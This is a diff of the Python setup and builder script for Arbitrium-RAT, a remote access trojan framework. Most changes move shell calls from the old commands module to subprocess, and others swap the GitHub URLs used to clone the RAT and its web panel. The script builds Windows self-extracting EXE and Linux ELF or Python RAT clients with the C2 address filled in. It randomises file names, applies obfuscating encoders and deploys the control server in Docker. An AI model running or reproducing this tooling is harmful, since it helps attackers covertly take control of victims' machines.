@@ -2,7 +2,7 @@
 
 from PyInquirer import prompt
 import sys, json, os, socket
-import random, commands
+import random, subprocess
 from menus import menus_dict, DomainValidator, PortValidator, directoryExist, fileExist
 
 
@@ -43,7 +43,7 @@ def check_port(setp):
 def checkInstallationX():
 	if os.geteuid():
 		sys.exit("\n[-] Please run the script as root!\n")
-	_ = commands.getoutput("docker images 2>&1 | grep arbitrium-rat")
+	_ = subprocess.getoutput("docker images 2>&1 | grep arbitrium-rat")
 	if not len(_):
 		answers = prompt([{
         'type': 'confirm',
@@ -62,7 +62,7 @@ def checkInstallationX():
 def checkInstallation():
 	if os.geteuid():
 		sys.exit("\n[-] Please run the script as root!\n")
-	_ = commands.getoutput("cat .env.conf")
+	_ = subprocess.getoutput("cat .env.conf")
 	if "cat: .env.conf: No such file" in _:
 		answers = prompt([{
         'type': 'confirm',
@@ -79,7 +79,7 @@ def checkInstallation():
 			adjust_f += " ".join(["{}/docker/{}-docker".format(current_path, i.lower()) for i in answers['docker_settings']])
 			_ = os.system("cat {} > /tmp/arbitrium-docker \
 				&& {}/setup.sh /tmp/arbitrium-docker".format(adjust_f, current_path))
-		_ = commands.getoutput("touch {}/.env.conf".format(current_path))
+		_ = subprocess.getoutput("touch {}/.env.conf".format(current_path))
 
 
 
@@ -88,13 +88,13 @@ def run_docker(params):
 	with open(docker_script, "w") as f:
 		f.write("#!/bin/bash\n" + "\n".join(accu_settings['docker_run']))
 
-	_ = commands.getoutput("docker rm arbitrium -f")
+	_ = subprocess.getoutput("docker rm arbitrium -f")
 	if params['list_choice'] == 'deployserver':
 		docker_sh = "docker run -itd -p {}:4321 -p {}:80 --name arbitrium benchaliah/arbitrium-rat && \
             docker cp {} arbitrium:/root/initArbitrium.sh && \
             docker exec -it arbitrium bash /root/initArbitrium.sh".format(params['webport'], params['lport'], docker_script)
 	else:
-		_ = commands.getoutput("rm -rf {}/output && mkdir {}/output".format(current_path, current_path))
+		_ = subprocess.getoutput("rm -rf {}/output && mkdir {}/output".format(current_path, current_path))
 		docker_sh = "docker run -itd --name arbitrium benchaliah/arbitrium-rat && \
             docker cp {} arbitrium:/root/initArbitrium.sh && \
             docker cp docker_assets/. arbitrium:/root/build_assets/ && \
@@ -124,7 +124,7 @@ def apply_encoder(params, dest):
 	}])
 	apply_enc = choices_dict[answers['encoder']].__name__.split('.')[1]
 
-	exit_status = commands.getstatusoutput("cd {}/encoders/{} && cp {}.layout cryptFrame.layout.tmp &&\
+	exit_status = subprocess.getstatusoutput("cd {}/encoders/{} && cp {}.layout cryptFrame.layout.tmp &&\
 		sed -i s/{{API_FQDN}}/{}/g cryptFrame.layout.tmp &&\
 	 python encoder.py > {} &&\
 	 rm cryptFrame.layout.tmp".format(current_path, apply_enc, params['platform'], params['fqdn'], dest))[0]
@@ -150,7 +150,7 @@ def _cleanarbitriumsenviroment_(*args):
 		}
 	])
 	if answers['docker']:
-		_ = commands.getoutput("docker rm arbitrium -f")
+		_ = subprocess.getoutput("docker rm arbitrium -f")
 		print("\r\033[92m [!] the server container was removed successfully\033[0m\n")
 
 
@@ -165,7 +165,7 @@ def _fullreset_(*args):
 		}
 	])
 	if answers['docker']:
-		_ = commands.getoutput("rm {}/.env.conf && docker rmi benchaliah/arbitrium-rat -f".format(current_path))
+		_ = subprocess.getoutput("rm {}/.env.conf && docker rmi benchaliah/arbitrium-rat -f".format(current_path))
 		print("\r\033[92m [!] the reset is finished, run main.py to start a new installation\033[0m\n")
 		sys.exit(0)
 
@@ -227,14 +227,14 @@ def _generateclients_windows_(params):
 def _generateclients_windows__(params):
 	get_str = lambda l: "".join([random.choice("abcdefghijklmnopqrstuvwxyz") for i in range(l)])
 	singleFrame, start_script = get_str(random.randint(6,8)), get_str(random.randint(6,8))
-	_ = commands.getoutput("rm -rf {}/output/Windows && mkdir -p {}/output/Windows".format(*[current_path]*2))
+	_ = subprocess.getoutput("rm -rf {}/output/Windows && mkdir -p {}/output/Windows".format(*[current_path]*2))
 	params['lhost'] = '127.0.0.1' if not len(params['lhost']) else params['lhost']
 	params['lport'] = '80' if not len(params['lport']) else params['lport']
 	params['fqdn'] = "{}:{}".format(params['lhost'], params['lport']) if params['lport'] != '80' else params['lhost']
 	params['platform'] = 'windows'
 	if params['list_choice'] == 'exe':
 
-		_ = commands.getoutput("cd " + current_path + " && cp layouts/Windows/* docker_assets/ &&\
+		_ = subprocess.getoutput("cd " + current_path + " && cp layouts/Windows/* docker_assets/ &&\
 			sed -i s/{{API_FQDN}}/{}/g docker_assets/singleFrame.py &&\
 			mv docker_assets/singleFrame.py docker_assets/{}.py".format(params['fqdn'], singleFrame))
 
@@ -249,7 +249,7 @@ def _generateclients_windows__(params):
 		accu_settings['docker_run'].append("rar a -r -cfg -sfxwindows.sfx -zSFXAutoInstaller.conf -XSFXAutoInstaller.conf WinApp.exe")
 
 	elif params['list_choice'] == 'python':
-		_ = commands.getoutput("cd " + current_path + " && cp layouts/Windows/singleFrame.py output/Windows/singleFrame.py &&\
+		_ = subprocess.getoutput("cd " + current_path + " && cp layouts/Windows/singleFrame.py output/Windows/singleFrame.py &&\
 			sed -i s/{{API_FQDN}}/{}/g output/Windows/singleFrame.py".format(params['fqdn']))
 		if params['obfuscate']:
 			apply_encoder(params, "{}/output/Windows/singleFrame.py".format(current_path))
@@ -278,7 +278,7 @@ def _generateclients_linux_(params):
 def _generateclients_linux__(params):
 	get_str = lambda l: "".join([random.choice("abcdefghijklmnopqrstuvwxyz") for i in range(l)])
 	singleFrame, start_script = get_str(random.randint(6,8)), get_str(random.randint(6,8))
-	_ = commands.getoutput("rm -rf {}/output/Linux && mkdir -p {}/output/Linux".format(*[current_path]*2))
+	_ = subprocess.getoutput("rm -rf {}/output/Linux && mkdir -p {}/output/Linux".format(*[current_path]*2))
 	params['lhost'] = '127.0.0.1' if not len(params['lhost']) else params['lhost']
 	params['lport'] = '80' if not len(params['lport']) else params['lport']
 	params['fqdn'] = "{}:{}".format(params['lhost'], params['lport']) if params['lport'] != '80' else params['lhost']
@@ -286,7 +286,7 @@ def _generateclients_linux__(params):
 
 	if params['list_choice'] == 'elf':
 
-		_ = commands.getoutput("cd " + current_path + " && cp layouts/Linux/* docker_assets/ &&\
+		_ = subprocess.getoutput("cd " + current_path + " && cp layouts/Linux/* docker_assets/ &&\
 			sed -i s/{{API_FQDN}}/{}/g docker_assets/singleFrame.py &&\
 			mv docker_assets/singleFrame.py docker_assets/{}.py".format(params['fqdn'], singleFrame))
 
@@ -297,7 +297,7 @@ def _generateclients_linux__(params):
 			apply_encoder(params, "{}/docker_assets/{}.py".format(current_path, singleFrame))
 
 	elif params['list_choice'] == 'python':
-		_ = commands.getoutput("cd " + current_path + " && cp layouts/Linux/singleFrame.py output/Linux/singleFrame.py &&\
+		_ = subprocess.getoutput("cd " + current_path + " && cp layouts/Linux/singleFrame.py output/Linux/singleFrame.py &&\
 			sed -i s/{{API_FQDN}}/{}/g output/Linux/singleFrame.py".format(params['fqdn']))
 		if params['obfuscate']:
 			apply_encoder(params, "{}/output/Linux/singleFrame.py".format(current_path))
@@ -310,13 +310,13 @@ def _generateclients_linux_native_(params):
 
 
 def _deployserver_(params):
-	_ = commands.getoutput("docker rm arbitrium -f")
+	_ = subprocess.getoutput("docker rm arbitrium -f")
 	params['lhost'] = '127.0.0.1' if not len(params['lhost']) else params['lhost']
 	params['lport'] = '80' if not len(params['lport']) else params['lport']
 	params['webport'] = '4321' if not len(params['webport']) else params['webport']
 	if check_port(int(params['lport'])) and check_port(int(params['webport'])):
-		accu_settings['docker_run'].append("cd /root/build_assets && git clone https://github.com/benchaliah/Arbitrium-RAT.git --recursive")
-		accu_settings['docker_run'].append("cd Arbitrium-RAT && rm -rf WebApp && git clone https://github.com/benchaliah/Arbitrium-WebApp.git && mv Arbitrium-WebApp WebApp")
+		accu_settings['docker_run'].append("cd /root/build_assets && git clone https://github.com/umriWe/Arbitrium-RAT.git --recursive")
+		accu_settings['docker_run'].append("cd Arbitrium-RAT && rm -rf WebApp && git clone https://github.com/sh1nu11bi/Arbitrium-WebApp && mv Arbitrium-WebApp WebApp")
 		accu_settings['docker_run'].append("cd /root/build_assets/Arbitrium-RAT/WebApp")
 		accu_settings['docker_run'].append("./setAPI_FQDN.sh {}:{}".format(params['lhost'], params['lport']))
 		accu_settings['docker_run'].append("cd /root/build_assets/Arbitrium-RAT")
